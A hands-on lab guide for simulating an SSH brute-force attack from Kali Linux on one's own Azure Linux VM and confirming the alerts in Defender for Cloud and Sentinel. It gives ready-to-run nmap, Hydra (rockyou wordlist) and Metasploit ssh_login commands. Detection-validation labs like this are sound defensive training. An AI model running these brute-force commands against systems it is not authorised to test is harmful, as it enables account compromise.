# 🔴 Lab 26: Simulating SSH Brute Force Attack with Kali Linux

> **Category:** Attack Simulation | **Difficulty:** Intermediate

## Objective
Simulate a real-world SSH brute force attack against an Azure Linux VM using Kali Linux, then validate detection via Microsoft Defender for Cloud and Microsoft Sentinel.

---

## Prerequisites
- Azure Linux VM (Ubuntu) with SSH port (22) open — see [Lab A: Creating Linux VM](25-defender-for-cloud.md)
- Kali Linux VM (local or virtual)
- Microsoft Defender for Cloud enabled with Defender for Servers Plan 1

---

## Step 1 — Create an Inbound Port Rule for SSH

1. Go to **Virtual Machines** → select your Linux VM
2. Navigate to **Network Settings** → **Create port rule** → **Inbound port rule**
3. Configure the rule:

| Field | Value |
|---|---|
| Service | SSH |
| Port | 22 |
| Protocol | TCP |
| Action | Allow |
| Priority | (auto) |

4. Click **Add**

---

## Step 2 — Assign a Public IP to the VM

1. Go to **Virtual Machines** → select your VM → **Network Settings**
2. Click **Configure** → **ipconfig1**
3. Check **Associate public IP address** → **Public IP address** → **New**
4. Click **Save**

> Note your VM's **Public IP Address** — you'll need it for the attack simulation.

---

## Step 3 — Port Scanning with NMAP (Kali Linux)

Open a terminal in Kali Linux and run:

```bash
sudo nmap -Pn <YOUR_VM_PUBLIC_IP> -oN scan_result.nmap
```

**Expected output:**
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-28 13:56 +0530
Nmap scan report for <IP>
Host is up (0.089s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh

Nmap done: 1 IP address (1 host up) scanned in 56.55 seconds
```

Port 22 is open — recon phase complete. ✅

---

## Step 4 — Brute Force with THC Hydra

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<YOUR_VM_PUBLIC_IP>
```

> The attack will generate thousands of failed login attempts — which is exactly what we want Defender for Cloud to detect.

---

## Step 5 — Brute Force with Metasploit

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <YOUR_VM_PUBLIC_IP>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```

> You will likely see: `Connection closed by Remote Host` — this is expected behavior as Azure's security layers respond.

---

## Step 6 — Validate Detection in Defender for Cloud

1. Go to **Azure Portal** → **Microsoft Defender for Cloud**
2. Navigate to **Security Alerts**
3. Look for: **"Number of failed Log In Attempt"** or similar SSH brute force alert

The alert will contain:
- Source IP address of the attack
- Number of failed attempts
- Target resource (your Linux VM)
- Timestamps

---

## Step 7 — Investigate in Microsoft Sentinel

1. Go to **Microsoft Sentinel** → **Incidents**
2. Find the incident forwarded from Defender for Cloud
3. Click **View Full Details** to investigate
4. Click **Investigate in Microsoft Defender XDR** for deep-dive analysis

---

## What Was Detected?

| Tool Used | Activity Generated |
|---|---|
| NMAP | Port scan / reconnaissance |
| Hydra | SSH brute force (failed logins) |
| Metasploit | SSH brute force (failed logins) |

---

## Key Takeaways

- Defender for Cloud detects OS-level threats including brute force attacks, fileless attacks, and suspicious process executions
- Alerts are automatically forwarded to Microsoft Sentinel when the Defender for Cloud data connector is enabled
- Real attacker behavior (recon → exploit) can be simulated in a safe lab environment for detection validation
- MITRE ATT&CK mapping: **Credential Access → Brute Force → Password Spraying (T1110.003)**
